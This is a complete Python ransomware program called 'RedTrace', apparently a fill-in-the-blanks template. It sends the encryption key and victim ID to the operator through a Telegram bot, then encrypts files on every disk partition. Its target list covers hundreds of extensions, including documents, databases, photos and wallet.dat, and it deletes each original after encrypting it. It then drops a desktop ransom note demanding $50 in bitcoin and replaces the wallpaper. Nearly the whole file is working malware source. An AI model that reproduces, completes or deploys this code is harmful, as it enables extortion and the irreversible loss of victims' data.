import os
import base64
import concurrent.futures
import requests
import hashlib
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import winshell
import ctypes
import psutil
import mmap

btcAddress = "Bitcoin Adress"
email = "your email (dont use gmail)"

class BotNotifier:
    def __init__(self, bot_token, chat_ids):
        self.bot_token = bot_token
        self.chat_ids = chat_ids

    def send_key_message(self, random_id, encryption_key):
        try:
            key_message = f"Encryption Key: {base64.b64encode(encryption_key).decode('utf-8')}"
            full_message = f"Unique ID: {random_id}\n{key_message}"

            telegram_endpoint = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            for chat_id in self.chat_ids:
                telegram_params = {
                    'chat_id': chat_id,
                    'text': full_message,
                    'parse_mode': 'Markdown'
                }
                telegram_response = requests.get(telegram_endpoint, params=telegram_params)
                if telegram_response.status_code == 200:
                    print(f"Data sent to Telegram chat ID {chat_id} successfully.")
                else:
                    print(f"Failed to send data to Telegram chat ID {chat_id}. Status code: {telegram_response.status_code}")

        except Exception as e:
            print(f"Error in send_key_message: {e}")

def generate_unique_id():
    return secrets.token_hex(6)

def generate_aes_key():
    return hashlib.sha256(os.urandom(32)).digest()

def is_file_in_use(file_path):
    try:
        with open(file_path, 'rb+'):
            pass
        return False
    except IOError:
        return True

def encrypt_file(file_path, key):
    try:
        if is_file_in_use(file_path):
            print(f'Skipping {file_path} because it is in use.')
            return

        with open(file_path, 'rb') as file:
            with mmap.mmap(file.fileno(), length=0, access=mmap.ACCESS_READ) as mm:
                plaintext = mm.read()

        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = iv + encryptor.update(plaintext) + encryptor.finalize()

        encrypted_file_path = file_path + '.redtrace'
        with open(encrypted_file_path, 'wb') as file:
            file.write(ciphertext)

        os.remove(file_path)
        print(f'Encrypted: {file_path} -> {encrypted_file_path}')

    except Exception as e:
        print(f'Error encrypting {file_path}: {e}')

def scan_and_encrypt(root_dir, extensions, key):
    def process_file(file_path):
        encrypt_file(file_path, key)

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for foldername, _, filenames in os.walk(root_dir):
            file_paths = [os.path.join(foldername, filename)
                          for filename in filenames
                          if any(filename.lower().endswith(ext) for ext in extensions)]
            executor.map(process_file, file_paths)

def create_readme_on_desktop(message):
    desktop_path = winshell.desktop()
    readme_path = os.path.join(desktop_path, "README.txt")
    with open(readme_path, 'w', encoding='utf-8') as readme_file:
        readme_file.write(message)
    print(f'Readme created on the desktop: {readme_path}')

def download_wallpaper(url, save_path):
    try:
        response = requests.get(url)
        with open(save_path, 'wb') as wallpaper_file:
            wallpaper_file.write(response.content)
        return True
    except Exception as e:
        print(f"Error downloading wallpaper: {e}")
        return False

def change_wallpaper(wallpaper_path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)

def main():
    bot_notifier = BotNotifier(bot_token="telegram bot token", chat_ids=["chat id", "leave blank or add another one if needed"])

    unique_id = generate_unique_id()
    aes_key = generate_aes_key()

    print(f'Unique ID: {unique_id}')
    print(f'AES Key: {base64.b64encode(aes_key)}')

    bot_notifier.send_key_message(unique_id, aes_key)

    custom_extensions = [
        '.txt', '.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', 
        '.csv', '.d3dbsp', '.sc2save', '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', 
        '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic', '.bkf', '.sidn', 
        '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', 
        '.mdbackup', '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', 
        '.fos', '.mcgame', '.vdf', '.ztmp', '.sis', '.sid', '.ncf', '.menu', '.layout', 
        '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf', '.iwd', 
        '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', 
        '.cfr', '.ff', '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', 
        '.db0', '.mp3', '.upx', '.rofl', '.hkx', '.bar', '.upk', '.das', '.iwi', '.litemod', 
        '.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav', '.lbf', '.slm', 
        '.bik', '.epk', '.rgss3a', '.pak', '.big', '.unity3d', '.wotreplay', '.xxx', 
        '.desc', '.py', '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg', '.p7c', 
        '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer', '.der', '.x3f', '.srw', '.pef', 
        '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref', '.mef', 
        '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', 
        '.dng', '.jpeg', '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd', 
        '.dbfv', '.mdf', '.wb2', '.rtf', '.wpd', '.dxg', '.xf', '.dwg', '.pst', '.accdb', 
        '.mdb', '.pptm', '.pptx', '.ppt', '.xlk', '.xlsb', '.xlsm', '.xlsx', '.xls', 
        '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods', 
        '.odt', '.sql', '.zip', '.tar', '.tar.gz', '.tgz', '.biz', '.ocx', '.html', 
        '.htm', '.3gp', '.srt', '.cpp', '.mid', '.mkv', '.mov', '.asf', '.mpeg', '.vob', 
        '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg', 
        '.aes', '.ARC', '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', 
        '.cgm', '.tif', '.tiff', '.NEF', '.cmd', '.class', '.jar', '.java', '.asp', 
        '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd', 
        '.MYI', '.MYD', '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', 
        '.lay', '.ms11(Securitycopy)', '.sldm', '.sldx', '.ppsm', '.ppsx', '.ppam', 
        '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', 
        '.dif', '.stc', '.sxc', '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', 
        '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw', '.ott', '.csr', '.key', 
        'wallet.dat'
    ]

    partitions = psutil.disk_partitions(all=True)
    for partition in partitions:
        root_directory = partition.mountpoint
        scan_and_encrypt(root_directory, custom_extensions, aes_key)

    readme_message = f"""
Hello,\n

    If you are reading this, your files have been affected by RedTrace Ransomware. We regret any inconvenience caused, at the end of the day we just want to get paid.\n

    All your files have been encrypted using AES encryption, making decryption without the correct key nearly impossible. To recover your files, please follow these steps:\n

    1. Download BitPay: [BitPay Wallet](https://bitpay.com/wallet/). If you are using a different wallet, that's fine.\n

    2. Send $50 in bitcoin to the following address:\n
        Bitcoin Address: {btcAddress}\n

    3. After sending the payment, wait for confirmation, and then send us an email with your UniqueID: {unique_id}.\n

    4. Wait briefly, and you will receive an email containing your decrypter once the process is completed.\n

    5. Failure to complete the payment within 2 weeks will result in the cessation of support.\n

    For further information:\n
    - Bitcoin Address: {btcAddress}\n
    - Email: {email}\n
    - UniqueID: {unique_id}\n

    ~ RedTrace Team
"""
    create_readme_on_desktop(readme_message)

    wallpaper_url = "image link"
    wallpaper_path = os.path.join(os.path.expanduser("~"), "Downloads", "617laafe.jpg")

    if download_wallpaper(wallpaper_url, wallpaper_path):
        change_wallpaper(wallpaper_path)

if __name__ == "__main__":
    main()
